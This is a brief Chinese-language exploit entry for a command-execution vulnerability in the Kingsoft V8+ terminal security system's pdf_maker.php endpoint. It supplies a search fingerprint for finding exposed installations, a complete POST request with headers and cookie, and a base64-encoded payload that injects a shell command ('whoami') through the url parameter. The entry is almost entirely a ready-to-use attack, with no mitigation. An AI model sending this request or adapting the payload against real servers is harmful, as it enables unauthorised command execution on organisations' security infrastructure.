# 金山V8+终端安全系统pdf_maker存在命令执行漏洞

- **系统**：金山V8+终端安全系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="猎鹰安全-金山V8+终端安全系统"`
- **请求**：`POST /inter/pdf_maker.php HTTP/1.1`
- **关键头**：`Content-Length: 45`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: PHPSESSID=750mnuf7f29e6dpsrp27r2p7o6`

**请求体 / payload**
```
url=Inx8IHdob2FtaSB8fA==&fileName=xxx
:---
```
- **预期**：200　|　—